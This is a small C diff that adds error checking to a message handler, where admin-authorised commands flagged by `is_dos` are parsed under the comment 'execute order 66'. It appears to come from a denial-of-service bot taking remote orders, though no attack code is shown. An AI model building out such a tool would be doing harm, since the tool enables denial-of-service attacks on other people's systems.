@@ -230,7 +230,9 @@ void start_recv (SOCKET s, pAccount account) {
                 } else if (is_admin (account, message)) {
                     if (is_dos (message->command)) {
                         // execute order 66
-                        parse_args (s, message);
+                        if (parse_args (s, message) == FALSE) {
+                            printf ("parse_args err\n");
+                        }
                     }
                 } else {
                     // deny access
